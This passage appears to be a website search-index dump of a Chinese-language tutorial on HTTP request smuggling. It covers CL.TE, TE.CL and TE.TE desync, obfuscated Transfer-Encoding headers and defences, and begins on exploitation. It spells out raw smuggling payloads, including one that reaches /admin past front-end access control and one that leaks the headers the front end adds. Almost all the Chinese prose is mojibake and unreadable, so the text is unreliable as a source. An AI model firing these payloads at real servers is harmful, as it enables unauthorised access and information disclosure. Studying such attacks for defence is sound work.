å®‰å…¨ä¹‹ HTTP request smuggling","uri":"/translation/web-security/request-smuggling/http-request-smuggling/"},{"categories":["web security"],"content":"HTTP è¯·æ±‚èµ°ç§åˆ°åº•å‘ç”Ÿäº†ä»€ä¹ˆ ç°åœ¨çš„åº”ç”¨æ¶æ„ä¸­ç»å¸¸ä¼šä½¿ç”¨è¯¸å¦‚è´Ÿè½½å‡è¡¡ã€åå‘ä»£ç†ã€ç½‘å…³ç­‰æœåŠ¡ï¼Œè¿™äº›æœåŠ¡åœ¨é“¾è·¯ä¸Šèµ·åˆ°äº†ä¸€ä¸ªè½¬å‘è¯·æ±‚ç»™åç«¯æœåŠ¡å™¨çš„ä½œç”¨ï¼Œå› ä¸ºä½ç½®ä½äºåç«¯æœåŠ¡å™¨çš„å‰é¢ï¼Œæ‰€ä»¥æœ¬æ–‡æŠŠä»–ä»¬ç§°ä¸ºå‰ç«¯æœåŠ¡å™¨ã€‚ å½“å‰ç«¯æœåŠ¡å™¨ï¼ˆè½¬å‘æœåŠ¡ï¼‰å°† HTTP è¯·æ±‚è½¬å‘ç»™åç«¯æœåŠ¡å™¨æ—¶ï¼Œå®ƒé€šå¸¸ä¼šé€šè¿‡ä¸åç«¯æœåŠ¡å™¨ä¹‹é—´çš„åŒä¸€ä¸ªç½‘ç»œè¿æ¥å‘é€å¤šä¸ªè¯·æ±‚ï¼Œå› ä¸ºè¿™æ ·åšæ›´åŠ é«˜æ•ˆã€‚åè®®éå¸¸ç®€å•ï¼šHTTP è¯·æ±‚è¢«ä¸€ä¸ªæ¥ä¸€ä¸ªåœ°å‘é€ï¼Œæ¥å—è¯·æ±‚çš„æœåŠ¡å™¨åˆ™è§£æ HTTP è¯·æ±‚å¤´ä»¥ç¡®å®šä¸€ä¸ªè¯·æ±‚çš„ç»“æŸä½ç½®å’Œä¸‹ä¸€ä¸ªè¯·æ±‚çš„å¼€å§‹ä½ç½®ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå‰ç«¯æœåŠ¡å™¨ï¼ˆè½¬å‘æœåŠ¡ï¼‰ä¸åç«¯ç³»ç»Ÿå¿…é¡»å°±è¯·æ±‚çš„è¾¹ç•Œè¾¾æˆä¸€è‡´ã€‚å¦åˆ™ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šå‘é€ä¸€ä¸ªæ¨¡æ£±ä¸¤å¯çš„è¯·æ±‚ï¼Œè¯¥è¯·æ±‚è¢«å‰ç«¯æœåŠ¡å™¨ï¼ˆè½¬å‘æœåŠ¡ï¼‰ä¸åç«¯ç³»ç»Ÿä»¥ä¸åŒçš„æ–¹å¼è§£æï¼š å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œæ”»å‡»è€…ä½¿ä¸Šä¸€ä¸ªè¯·æ±‚çš„ä¸€éƒ¨åˆ†è¢«åç«¯æœåŠ¡å™¨è§£æä¸ºä¸‹ä¸€ä¸ªè¯·æ±‚çš„å¼€å§‹ï¼Œè¿™æ—¶å°±ä¼šå¹²æ‰°åº”ç”¨ç¨‹åºå¤„ç†è¯¥è¯·æ±‚çš„æ–¹å¼ã€‚è¿™å°±æ˜¯è¯·æ±‚èµ°ç§æ”»å‡»ï¼Œå…¶å¯èƒ½ä¼šé€ æˆæ¯ç­æ€§çš„åæœã€‚ ","date":"2021-03-04","objectID":"/translation/web-security/request-smuggling/http-request-smuggling/:2:0","tags":[],"title":"web å®‰å…¨ä¹‹ HTTP request smuggling","uri":"/translation/web-security/request-smuggling/http-request-smuggling/"},{"categories":["web security"],"content":"HTTP è¯·æ±‚èµ°ç§æ¼æ´æ˜¯æ€ä¹ˆäº§ç”Ÿçš„ ç»å¤§å¤šæ•° HTTP è¯·æ±‚èµ°ç§æ¼æ´çš„å‡ºç°æ˜¯å› ä¸º HTTP è§„èŒƒæä¾›äº†ä¸¤ç§ä¸åŒçš„æ–¹æ³•æ¥æŒ‡å®šè¯·æ±‚çš„ç»“æŸä½ç½®ï¼šContent-Length å¤´å’Œ Transfer-Encoding å¤´ã€‚ Content-Length å¤´å¾ˆç®€å•ï¼Œç›´æ¥ä»¥å­—èŠ‚ä¸ºå•ä½æŒ‡å®šæ¶ˆæ¯ä½“çš„é•¿åº¦ã€‚ä¾‹å¦‚ï¼š POST /search HTTP/1.1 Host: normal-website.com Content-Type: application/x-www-form-urlencoded Content-Length: 11 q=smuggling Transfer-Encoding å¤´åˆ™å¯ä»¥å£°æ˜æ¶ˆæ¯ä½“ä½¿ç”¨äº† chunked ç¼–ç ï¼Œå°±æ˜¯æ¶ˆæ¯ä½“è¢«æ‹†åˆ†æˆäº†ä¸€ä¸ªæˆ–å¤šä¸ªåˆ†å—ä¼ è¾“ï¼Œæ¯ä¸ªåˆ†å—çš„å¼€å¤´æ˜¯å½“å‰åˆ†å—å¤§å°ï¼ˆä»¥åå…­è¿›åˆ¶è¡¨ç¤ºï¼‰ï¼Œåé¢ç´§è·Ÿç€ \\r\\nï¼Œç„¶åæ˜¯åˆ†å—å†…å®¹ï¼Œåé¢ä¹Ÿæ˜¯ \\r\\nã€‚æ¶ˆæ¯çš„ç»ˆæ­¢åˆ†å—ä¹Ÿæ˜¯åŒæ ·çš„æ ¼å¼ï¼Œåªæ˜¯å…¶é•¿åº¦ä¸ºé›¶ã€‚ä¾‹å¦‚ï¼š POST /search HTTP/1.1 Host: normal-website.com Content-Type: application/x-www-form-urlencoded Transfer-Encoding: chunked b q=smuggling 0 ç”±äº HTTP è§„èŒƒæä¾›äº†ä¸¤ç§ä¸åŒçš„æ–¹æ³•æ¥æŒ‡å®š HTTP æ¶ˆæ¯çš„é•¿åº¦ï¼Œå› æ­¤å•ä¸ªæ¶ˆæ¯ä¸­å®Œå…¨å¯ä»¥åŒæ—¶ä½¿ç”¨è¿™ä¸¤ç§æ–¹æ³•ï¼Œä»è€Œä½¿å®ƒä»¬ç›¸äº’å†²çªã€‚HTTP è§„èŒƒä¸ºäº†é¿å…è¿™ç§æ­§ä¹‰ï¼Œå…¶å£°æ˜å¦‚æœ Content-Length å’Œ Transfer-Encoding åŒæ—¶å­˜åœ¨ï¼Œåˆ™ Content-Length åº”è¯¥è¢«å¿½ç•¥ã€‚å½“åªæœ‰ä¸€ä¸ªæœåŠ¡è¿è¡Œæ—¶ï¼Œè¿™ç§æ­§ä¹‰ä¼¼ä¹å¯ä»¥é¿å…ï¼Œä½†æ˜¯å½“å¤šä¸ªæœåŠ¡è¢«è¿æ¥åœ¨ä¸€èµ·æ—¶ï¼Œè¿™ç§æ­§ä¹‰å°±æ— æ³•é¿å…äº†ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå‡ºç°é—®é¢˜æœ‰ä¸¤ä¸ªåŸå› ï¼š æŸäº›æœåŠ¡å™¨ä¸æ”¯æŒè¯·æ±‚ä¸­çš„ Transfer-Encoding å¤´ã€‚ æŸäº›æœåŠ¡å™¨è™½ç„¶æ”¯æŒ Transfer-Encoding å¤´ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡æŸç§æ–¹å¼è¿›è¡Œæ··æ·†ï¼Œä»¥è¯±å¯¼ä¸å¤„ç†æ­¤æ ‡å¤´ã€‚ å¦‚æœå‰ç«¯æœåŠ¡å™¨ï¼ˆè½¬å‘æœåŠ¡ï¼‰å’Œåç«¯æœåŠ¡å™¨å¤„ç† Transfer-Encoding çš„è¡Œä¸ºä¸åŒï¼Œåˆ™å®ƒä»¬å¯èƒ½åœ¨è¿ç»­è¯·æ±‚ä¹‹é—´çš„è¾¹ç•Œä¸Šå­˜åœ¨åˆ†æ­§ï¼Œä»è€Œå¯¼è‡´è¯·æ±‚èµ°ç§æ¼æ´ã€‚ ","date":"2021-03-04","objectID":"/translation/web-security/request-smuggling/http-request-smuggling/:3:0","tags":[],"title":"web å®‰å…¨ä¹‹ HTTP request smuggling","uri":"/translation/web-security/request-smuggling/http-request-smuggling/"},{"categories":["web security"],"content":"å¦‚ä½•è¿›è¡Œ HTTP è¯·æ±‚èµ°ç§æ”»å‡» è¯·æ±‚èµ°ç§æ”»å‡»éœ€è¦åœ¨ HTTP è¯·æ±‚å¤´ä¸­åŒæ—¶ä½¿ç”¨ Content-Length å’Œ Transfer-Encodingï¼Œä»¥ä½¿å‰ç«¯æœåŠ¡å™¨ï¼ˆè½¬å‘æœåŠ¡ï¼‰å’Œåç«¯æœåŠ¡å™¨ä»¥ä¸åŒçš„æ–¹å¼å¤„ç†è¯¥è¯·æ±‚ã€‚å…·ä½“çš„æ‰§è¡Œæ–¹å¼å–å†³äºä¸¤å°æœåŠ¡å™¨çš„è¡Œä¸ºï¼š CL.TEï¼šå‰ç«¯æœåŠ¡å™¨ï¼ˆè½¬å‘æœåŠ¡ï¼‰ä½¿ç”¨ Content-Length å¤´ï¼Œè€Œåç«¯æœåŠ¡å™¨ä½¿ç”¨ Transfer-Encoding å¤´ã€‚ TE.CLï¼šå‰ç«¯æœåŠ¡å™¨ï¼ˆè½¬å‘æœåŠ¡ï¼‰ä½¿ç”¨ Transfer-Encoding å¤´ï¼Œè€Œåç«¯æœåŠ¡å™¨ä½¿ç”¨ Content-Length å¤´ã€‚ TE.TEï¼šå‰ç«¯æœåŠ¡å™¨ï¼ˆè½¬å‘æœåŠ¡ï¼‰å’Œåç«¯æœåŠ¡å™¨éƒ½ä½¿ç”¨ Transfer-Encoding å¤´ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡æŸç§æ–¹å¼æ··æ·†æ ‡å¤´æ¥è¯±å¯¼å…¶ä¸­ä¸€ä¸ªæœåŠ¡å™¨ä¸å¯¹å…¶è¿›è¡Œå¤„ç†ã€‚ ","date":"2021-03-04","objectID":"/translation/web-security/request-smuggling/http-request-smuggling/:4:0","tags":[],"title":"web å®‰å…¨ä¹‹ HTTP request smuggling","uri":"/translation/web-security/request-smuggling/http-request-smuggling/"},{"categories":["web security"],"content":"CL.TE æ¼æ´ å‰ç«¯æœåŠ¡å™¨ï¼ˆè½¬å‘æœåŠ¡ï¼‰ä½¿ç”¨ Content-Length å¤´ï¼Œè€Œåç«¯æœåŠ¡å™¨ä½¿ç”¨ Transfer-Encoding å¤´ã€‚æˆ‘ä»¬å¯ä»¥æ„é€ ä¸€ä¸ªç®€å•çš„ HTTP è¯·æ±‚èµ°ç§æ”»å‡»ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š POST / HTTP/1.1 Host: vulnerable-website.com Content-Length: 13 Transfer-Encoding: chunked 0 SMUGGLED å‰ç«¯æœåŠ¡å™¨ï¼ˆè½¬å‘æœåŠ¡ï¼‰ä½¿ç”¨ Content-Length ç¡®å®šè¿™ä¸ªè¯·æ±‚ä½“çš„é•¿åº¦æ˜¯ 13 ä¸ªå­—èŠ‚ï¼Œç›´åˆ° SMUGGLED çš„ç»“å°¾ã€‚ç„¶åè¯·æ±‚è¢«è½¬å‘ç»™äº†åç«¯æœåŠ¡å™¨ã€‚ åç«¯æœåŠ¡å™¨ä½¿ç”¨ Transfer-Encoding ï¼ŒæŠŠè¯·æ±‚ä½“å½“æˆæ˜¯åˆ†å—çš„ï¼Œç„¶åå¤„ç†ç¬¬ä¸€ä¸ªåˆ†å—ï¼Œåˆšå¥½åˆæ˜¯é•¿åº¦ä¸ºé›¶çš„ç»ˆæ­¢åˆ†å—ï¼Œå› æ­¤ç›´æ¥è®¤ä¸ºæ¶ˆæ¯ç»“æŸäº†ï¼Œè€Œåé¢çš„ SMUGGLED å°†ä¸äºˆå¤„ç†ï¼Œå¹¶å°†å…¶è§†ä¸ºä¸‹ä¸€ä¸ªè¯·æ±‚çš„å¼€å§‹ã€‚ ","date":"2021-03-04","objectID":"/translation/web-security/request-smuggling/http-request-smuggling/:4:1","tags":[],"title":"web å®‰å…¨ä¹‹ HTTP request smuggling","uri":"/translation/web-security/request-smuggling/http-request-smuggling/"},{"categories":["web security"],"content":"TE.CL æ¼æ´ å‰ç«¯æœåŠ¡å™¨ï¼ˆè½¬å‘æœåŠ¡ï¼‰ä½¿ç”¨ Transfer-Encoding å¤´ï¼Œè€Œåç«¯æœåŠ¡å™¨ä½¿ç”¨ Content-Length å¤´ã€‚æˆ‘ä»¬å¯ä»¥æ„é€ ä¸€ä¸ªç®€å•çš„ HTTP è¯·æ±‚èµ°ç§æ”»å‡»ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š POST / HTTP/1.1 Host: vulnerable-website.com Content-Length: 3 Transfer-Encoding: chunked 8 SMUGGLED 0 æ³¨æ„ï¼šä¸Šé¢çš„ 0 åé¢è¿˜æœ‰ \\r\\n\\r\\n ã€‚ å‰ç«¯æœåŠ¡å™¨ï¼ˆè½¬å‘æœåŠ¡ï¼‰ä½¿ç”¨ Transfer-Encoding å°†æ¶ˆæ¯ä½“å½“ä½œåˆ†å—ç¼–ç ï¼Œç¬¬ä¸€ä¸ªåˆ†å—çš„é•¿åº¦æ˜¯ 8 ä¸ªå­—èŠ‚ï¼Œå†…å®¹æ˜¯ SMUGGLEDï¼Œç¬¬äºŒä¸ªåˆ†å—çš„é•¿åº¦æ˜¯ 0 ï¼Œä¹Ÿå°±æ˜¯ç»ˆæ­¢åˆ†å—ï¼Œæ‰€ä»¥è¿™ä¸ªè¯·æ±‚åˆ°è¿™é‡Œç»ˆæ­¢ï¼Œç„¶åè¢«è½¬å‘ç»™äº†åç«¯æœåŠ¡ã€‚ åç«¯æœåŠ¡ä½¿ç”¨ Content-Length ï¼Œè®¤ä¸ºæ¶ˆæ¯ä½“åªæœ‰ 3 ä¸ªå­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯ 8\\r\\nï¼Œè€Œå‰©ä¸‹çš„éƒ¨åˆ†å°†ä¸ä¼šå¤„ç†ï¼Œå¹¶è§†ä¸ºä¸‹ä¸€ä¸ªè¯·æ±‚çš„å¼€å§‹ã€‚ ","date":"2021-03-04","objectID":"/translation/web-security/request-smuggling/http-request-smuggling/:4:2","tags":[],"title":"web å®‰å…¨ä¹‹ HTTP request smuggling","uri":"/translation/web-security/request-smuggling/http-request-smuggling/"},{"categories":["web security"],"content":"TE.TE æ··æ·† TE å¤´ å‰ç«¯æœåŠ¡å™¨ï¼ˆè½¬å‘æœåŠ¡ï¼‰å’Œåç«¯æœåŠ¡å™¨éƒ½ä½¿ç”¨ Transfer-Encoding å¤´ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡æŸç§æ–¹å¼æ··æ·†æ ‡å¤´æ¥è¯±å¯¼å…¶ä¸­ä¸€ä¸ªæœåŠ¡å™¨ä¸å¯¹å…¶è¿›è¡Œå¤„ç†ã€‚ æ··æ·† Transfer-Encoding å¤´çš„æ–¹å¼å¯èƒ½æ— ç©·æ— å°½ã€‚ä¾‹å¦‚ï¼š Transfer-Encoding: xchunked Transfer-Encoding : chunked Transfer-Encoding: chunked Transfer-Encoding: x Transfer-Encoding:[tab]chunked [space]Transfer-Encoding: chunked X: X[\\n]Transfer-Encoding: chunked Transfer-Encoding : chunked è¿™äº›æŠ€æœ¯ä¸­çš„æ¯ä¸€ç§éƒ½ä¸ HTTP è§„èŒƒæœ‰ç»†å¾®çš„ä¸åŒã€‚å®ç°åè®®è§„èŒƒçš„å®é™…ä»£ç å¾ˆå°‘ä»¥ç»å¯¹çš„ç²¾åº¦éµå®ˆåè®®è§„èŒƒï¼Œå¹¶ä¸”ä¸åŒçš„å®ç°é€šå¸¸ä¼šå®¹å¿ä¸åè®®è§„èŒƒçš„ä¸åŒå˜åŒ–ã€‚è¦æ‰¾åˆ° TE.TE æ¼æ´ï¼Œå¿…é¡»æ‰¾åˆ° Transfer-Encoding æ ‡å¤´çš„æŸç§å˜ä½“ï¼Œä»¥ä¾¿å‰ç«¯æœåŠ¡å™¨ï¼ˆè½¬å‘æœåŠ¡ï¼‰æˆ–åç«¯æœåŠ¡å™¨å…¶ä¸­ä¹‹ä¸€æ­£å¸¸å¤„ç†ï¼Œè€Œå¦å¤–ä¸€ä¸ªæœåŠ¡å™¨åˆ™å°†å…¶å¿½ç•¥ã€‚ æ ¹æ®å¯ä»¥æ··æ·†è¯±å¯¼ä¸å¤„ç† Transfer-Encoding çš„æ˜¯å‰ç«¯æœåŠ¡å™¨ï¼ˆè½¬å‘æœåŠ¡ï¼‰è¿˜æ˜¯åç«¯æœåŠ¡ï¼Œè€Œåçš„æ”»å‡»æ–¹å¼åˆ™ä¸ CL.TE æˆ– TE.CL æ¼æ´ç›¸åŒã€‚ ","date":"2021-03-04","objectID":"/translation/web-security/request-smuggling/http-request-smuggling/:5:0","tags":[],"title":"web å®‰å…¨ä¹‹ HTTP request smuggling","uri":"/translation/web-security/request-smuggling/http-request-smuggling/"},{"categories":["web security"],"content":"å¦‚ä½•é˜²å¾¡ HTTP è¯·æ±‚èµ°ç§æ¼æ´ å½“å‰ç«¯æœåŠ¡å™¨ï¼ˆè½¬å‘æœåŠ¡ï¼‰é€šè¿‡åŒä¸€ä¸ªç½‘ç»œè¿æ¥å°†å¤šä¸ªè¯·æ±‚è½¬å‘ç»™åç«¯æœåŠ¡å™¨ï¼Œä¸”å‰ç«¯æœåŠ¡å™¨ï¼ˆè½¬å‘æœåŠ¡ï¼‰ä¸åç«¯æœåŠ¡å™¨å¯¹è¯·æ±‚è¾¹ç•Œå­˜åœ¨ä¸ä¸€è‡´çš„åˆ¤å®šæ—¶ï¼Œå°±ä¼šå‡ºç° HTTP è¯·æ±‚èµ°ç§æ¼æ´ã€‚é˜²å¾¡ HTTP è¯·æ±‚èµ°ç§æ¼æ´çš„ä¸€äº›é€šç”¨æ–¹æ³•å¦‚ä¸‹ï¼š ç¦ç”¨åˆ°åç«¯æœåŠ¡å™¨è¿æ¥çš„é‡ç”¨ï¼Œä»¥ä¾¿æ¯ä¸ªè¯·æ±‚éƒ½é€šè¿‡å•ç‹¬çš„ç½‘ç»œè¿æ¥å‘é€ã€‚ å¯¹åç«¯æœåŠ¡å™¨è¿æ¥ä½¿ç”¨ HTTP/2 ï¼Œå› ä¸ºæ­¤åè®®å¯é˜²æ­¢å¯¹è¯·æ±‚ä¹‹é—´çš„è¾¹ç•Œäº§ç”Ÿæ­§ä¹‰ã€‚ å‰ç«¯æœåŠ¡å™¨ï¼ˆè½¬å‘æœåŠ¡ï¼‰å’Œåç«¯æœåŠ¡å™¨ä½¿ç”¨å®Œå…¨ç›¸åŒçš„ Web è½¯ä»¶ï¼Œä»¥ä¾¿å®ƒä»¬å°±è¯·æ±‚ä¹‹é—´çš„ç•Œé™è¾¾æˆä¸€è‡´ã€‚ åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå¯ä»¥é€šè¿‡ä½¿å‰ç«¯æœåŠ¡å™¨ï¼ˆè½¬å‘æœåŠ¡ï¼‰è§„èŒƒæ­§ä¹‰è¯·æ±‚æˆ–ä½¿åç«¯æœåŠ¡å™¨æ‹’ç»æ­§ä¹‰è¯·æ±‚å¹¶å…³é—­ç½‘ç»œè¿æ¥æ¥é¿å…æ¼æ´ã€‚ç„¶è€Œè¿™ç§æ–¹æ³•æ¯”ä¸Šé¢çš„é€šç”¨æ–¹æ³•æ›´å®¹æ˜“å‡ºé”™ã€‚ ","date":"2021-03-04","objectID":"/translation/web-security/request-smuggling/http-request-smuggling/:6:0","tags":[],"title":"web å®‰å…¨ä¹‹ HTTP request smuggling","uri":"/translation/web-security/request-smuggling/http-request-smuggling/"},{"categories":["web security"],"content":"Exploiting request smuggling","date":"2021-03-04","objectID":"/translation/web-security/request-smuggling/exploiting-request-smuggling/","tags":[],"title":"Exploiting request smuggling","uri":"/translation/web-security/request-smuggling/exploiting-request-smuggling/"},{"categories":["web security"],"content":"åˆ©ç”¨ HTTP è¯·æ±‚èµ°ç§æ¼æ´ åœ¨æœ¬èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†æè¿° HTTP è¯·æ±‚èµ°ç§æ¼æ´çš„å‡ ç§åˆ©ç”¨æ–¹æ³•ï¼Œè¿™ä¹Ÿå–å†³äºåº”ç”¨ç¨‹åºçš„é¢„æœŸåŠŸèƒ½å’Œå…¶ä»–è¡Œä¸ºã€‚ ","date":"2021-03-04","objectID":"/translation/web-security/request-smuggling/exploiting-request-smuggling/:0:0","tags":[],"title":"Exploiting request smuggling","uri":"/translation/web-security/request-smuggling/exploiting-request-smuggling/"},{"categories":["web security"],"content":"åˆ©ç”¨ HTTP è¯·æ±‚èµ°ç§æ¼æ´ç»•è¿‡å‰ç«¯æœåŠ¡å™¨ï¼ˆè½¬å‘æœåŠ¡ï¼‰å®‰å…¨æ§åˆ¶ åœ¨æŸäº›åº”ç”¨ç¨‹åºä¸­ï¼Œå‰ç«¯æœåŠ¡å™¨ï¼ˆè½¬å‘æœåŠ¡ï¼‰ä¸ä»…ç”¨æ¥è½¬å‘è¯·æ±‚ï¼Œä¹Ÿç”¨æ¥å®ç°äº†ä¸€äº›å®‰å…¨æ§åˆ¶ï¼Œä»¥å†³å®šå•ä¸ªè¯·æ±‚èƒ½å¦è¢«è½¬å‘åˆ°åç«¯å¤„ç†ï¼Œè€Œåç«¯æœåŠ¡è®¤ä¸ºæ¥å—åˆ°çš„æ‰€æœ‰è¯·æ±‚éƒ½å·²ç»é€šè¿‡äº†å®‰å…¨éªŒè¯ã€‚ å‡è®¾ï¼ŒæŸä¸ªåº”ç”¨ç¨‹åºä½¿ç”¨å‰ç«¯æœåŠ¡å™¨ï¼ˆè½¬å‘æœåŠ¡ï¼‰æ¥åšè®¿é—®æ§åˆ¶ï¼Œåªæœ‰å½“ç”¨æˆ·è¢«æˆæƒè®¿é—®çš„è¯·æ±‚æ‰ä¼šè¢«è½¬å‘ç»™åç«¯æœåŠ¡å™¨ï¼Œåç«¯æœåŠ¡å™¨æ¥å—çš„æ‰€æœ‰è¯·æ±‚éƒ½æ— éœ€è¿›ä¸€æ­¥æ£€æŸ¥ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¯ä»¥ä½¿ç”¨ HTTP è¯·æ±‚èµ°ç§æ¼æ´ç»•è¿‡è®¿é—®æ§åˆ¶ï¼Œå°†è¯·æ±‚èµ°ç§åˆ°åç«¯æœåŠ¡å™¨ã€‚ å‡è®¾å½“å‰ç”¨æˆ·å¯ä»¥è®¿é—® /home ï¼Œä½†ä¸èƒ½è®¿é—® /admin ã€‚ä»–ä»¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹è¯·æ±‚èµ°ç§æ”»å‡»ç»•è¿‡æ­¤é™åˆ¶ï¼š POST /home HTTP/1.1 Host: vulnerable-website.com Content-Type: application/x-www-form-urlencoded Content-Length: 62 Transfer-Encoding: chunked 0 GET /admin HTTP/1.1 Host: vulnerable-website.com Foo: xGET /home HTTP/1.1 Host: vulnerable-website.com å‰ç«¯æœåŠ¡å™¨ï¼ˆè½¬å‘æœåŠ¡ï¼‰å°†å…¶è§†ä¸ºä¸€ä¸ªè¯·æ±‚ï¼Œç„¶åè¿›è¡Œè®¿é—®éªŒè¯ï¼Œç”±äºç”¨æˆ·æ‹¥æœ‰è®¿é—® /home çš„æƒé™ï¼Œå› æ­¤æŠŠè¯·æ±‚è½¬å‘ç»™åç«¯æœåŠ¡å™¨ã€‚ç„¶è€Œï¼Œåç«¯æœåŠ¡å™¨åˆ™å°†å…¶è§†ä¸º /home å’Œ /admin ä¸¤ä¸ªå•ç‹¬çš„è¯·æ±‚ï¼Œå¹¶ä¸”è®¤ä¸ºè¯·æ±‚éƒ½é€šè¿‡äº†æƒé™éªŒè¯ï¼Œæ­¤æ—¶ /admin çš„è®¿é—®æ§åˆ¶å®é™…ä¸Šå°±è¢«ç»•è¿‡äº†ã€‚ ","date":"2021-03-04","objectID":"/translation/web-security/request-smuggling/exploiting-request-smuggling/:1:0","tags":[],"title":"Exploiting request smuggling","uri":"/translation/web-security/request-smuggling/exploiting-request-smuggling/"},{"categories":["web security"],"content":"å‰ç«¯æœåŠ¡å™¨ï¼ˆè½¬å‘æœåŠ¡ï¼‰å¯¹è¯·æ±‚é‡å†™ åœ¨è®¸å¤šåº”ç”¨ç¨‹åºä¸­ï¼Œè¯·æ±‚è¢«è½¬å‘ç»™åç«¯æœåŠ¡ä¹‹å‰ä¼šè¿›è¡Œä¸€äº›é‡å†™ï¼Œé€šå¸¸æ˜¯æ·»åŠ ä¸€äº›é¢å¤–çš„è¯·æ±‚å¤´ä¹‹ç±»çš„ã€‚ä¾‹å¦‚ï¼Œè½¬å‘è¯·æ±‚é‡å†™å¯èƒ½ï¼š ç»ˆæ­¢ TLS è¿æ¥å¹¶æ·»åŠ ä¸€äº›æè¿°ä½¿ç”¨çš„åè®®å’Œå¯†é’¥ä¹‹ç±»çš„å¤´ã€‚ æ·»åŠ  X-Forwarded-For å¤´ç”¨æ¥æ ‡è®°ç”¨æˆ·çš„ IP åœ°å€ã€‚ æ ¹æ®ç”¨æˆ·çš„ä¼šè¯ä»¤ç‰Œç¡®å®šç”¨æˆ· ID ï¼Œå¹¶æ·»åŠ ç”¨äºæ ‡è¯†ç”¨æˆ·çš„å¤´ã€‚ æ·»åŠ ä¸€äº›å…¶ä»–æ”»å‡»æ„Ÿå…´è¶£çš„æ•æ„Ÿä¿¡æ¯ã€‚ åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå¦‚æœä½ èµ°ç§çš„è¯·æ±‚ç¼ºå°‘ä¸€äº›å‰ç«¯æœåŠ¡å™¨ï¼ˆè½¬å‘æœåŠ¡ï¼‰æ·»åŠ çš„å¤´ï¼Œé‚£ä¹ˆåç«¯æœåŠ¡å¯èƒ½ä¸ä¼šæ­£å¸¸å¤„ç†ï¼Œä»è€Œå¯¼è‡´èµ°ç§è¯·æ±‚æ— æ³•è¾¾åˆ°é¢„æœŸçš„æ•ˆæœã€‚ é€šå¸¸æœ‰ä¸€äº›ç®€å•çš„æ–¹æ³•å¯ä»¥å‡†ç¡®åœ°å¾—çŸ¥å‰ç«¯æœåŠ¡å™¨ï¼ˆè½¬å‘æœåŠ¡ï¼‰æ˜¯å¦‚ä½•é‡å†™è¯·æ±‚çš„ã€‚ä¸ºæ­¤ï¼Œéœ€è¦æ‰§è¡Œä»¥ä¸‹æ­¥éª¤ï¼š æ‰¾åˆ°ä¸€ä¸ªå°†è¯·æ±‚å‚æ•°çš„å€¼åæ˜ åˆ°åº”ç”¨ç¨‹åºå“åº”ä¸­çš„ POST è¯·æ±‚ã€‚ éšæœºæ’åˆ—å‚æ•°ï¼Œä»¥ä½¿åæ˜ çš„å‚æ•°å‡ºç°åœ¨æ¶ˆæ¯ä½“çš„æœ€åã€‚ å°†è¿™ä¸ªè¯·æ±‚èµ°ç§åˆ°åç«¯æœåŠ¡å™¨ï¼Œç„¶åç›´æ¥å‘é€ä¸€ä¸ªè¦æ˜¾ç¤ºå…¶é‡å†™å½¢å¼çš„æ™®é€šè¯·æ±‚ã€‚ å‡è®¾åº”ç”¨ç¨‹åºæœ‰ä¸ªç™»å½•çš„åŠŸèƒ½ï¼Œå…¶ä¼šåæ˜  email å‚æ•°ï¼š POST /login HTTP/1.1 Host: vulnerable-website.com Content-Type: application/x-www-form-urlencoded Content-Length: 28 email=wiener@normal-user.net å“åº”å†…å®¹åŒ…æ‹¬ï¼š \u003cinput id=\"email\" value=\"wiener@normal-user.net\" type=\"text\"\u003e æ­¤æ—¶ï¼Œä½ å¯ä»¥ä½¿ç”¨ä»¥ä¸‹è¯·æ±‚èµ°ç§æ”»å‡»æ¥æ­ç¤ºå‰ç«¯æœåŠ¡å™¨ï¼ˆè½¬å‘æœåŠ¡ï¼‰å¯¹è¯·æ±‚çš„é‡å†™ï¼š POST / HTTP/1.1 Host: vulnerable-website.com Content-Length: 130 Transfer-Encoding: chunked 0 POST /login HTTP/1.1 Host: vulnerable-website.com Content-Type: application/x-www-form-urlencoded Content-Length: 100 email=POST /login HTTP/1.1 Host: vulnerable-website.com ... å‰ç«¯æœåŠ¡å™¨ï¼ˆè½¬å‘æœåŠ¡ï¼‰å°†ä¼šé‡å†™è¯·æ±‚ä»¥æ·»åŠ æ ‡å¤´ï¼Œç„¶ååç«¯æœåŠ¡å™¨å°†å¤„ç†èµ°ç§è¯·æ±‚ï¼Œå¹¶å°†ç¬¬äºŒä¸ªè¯·æ±‚å½“ä½œ email å‚æ•°çš„å€¼ï¼Œä¸”åœ¨å“åº”ä¸­åæ˜ å‡ºæ¥ï¼š \u003cinput id=\"email\" value=\"POST /login HTTP/1.1 Host: vulnerable-website.com X-Forwarded-For: 1.3.3.7 X-Forwarded-Proto: https X-TLS-Bits: 128 X-TLS-Cipher: ECDHE-RSA-AES128-GCM-SHA256 X-TLS-Version: TLSv1.2 x-nr-external-service: external ... æ³¨æ„ï¼šç”±äºæœ€åçš„è¯·æ±‚æ­£åœ¨é‡å†™ï¼Œä½ ä¸çŸ¥é“å®ƒéœ€è¦å¤šé•¿æ—¶é—´ç»“æŸã€‚èµ°ç§è¯·æ±‚ä¸­çš„ Content-Length 